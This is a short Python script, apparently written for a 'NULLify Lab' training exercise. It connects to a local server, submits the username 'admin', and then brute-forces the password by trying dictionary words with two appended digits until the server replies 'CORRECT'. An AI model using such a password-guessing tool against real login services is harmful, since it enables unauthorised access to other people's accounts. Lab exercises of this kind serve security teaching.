#!/usr/bin/python

#Python password guessing client for NULLify Lab
#By Spencer McClain

#Import Needed Plugins
from socket import *
import random
import time

#Set Host and Port to connect to
HOST = '127.0.0.1'
PORT = 8675

#Set socket object and connect to Host on set Port
sock = socket(AF_INET,SOCK_STREAM)
sock.connect((HOST, PORT))
print 'connected'

done = False
start = time.time() #Start timer to see how long it takes

dic = open('dictionary.txt', 'r')

resp = ''
#Start Guessing!
resp = sock.recv(1024)
print resp
print 'admin'
sock.send('admin')

while done is False:
	resp = sock.recv(1024)
	print resp
	for word in dic:
		for num in range(10):
			for num2 in range(10):
				if done is True:
					break
				guess = word.strip('\n')+str(num)+str(num2)
				print 'guessing: '+guess
				sock.send(guess)
				resp = sock.recv(2048)
				if "CORRECT" in resp:
					print 'The password is: '+guess
					print resp
					done = True


elapsed = (time.time() - start) #Calculate how long it took
print 'Time to guess password: '+str(elapsed) #Print how long to took to win
sock.close() #Close the socket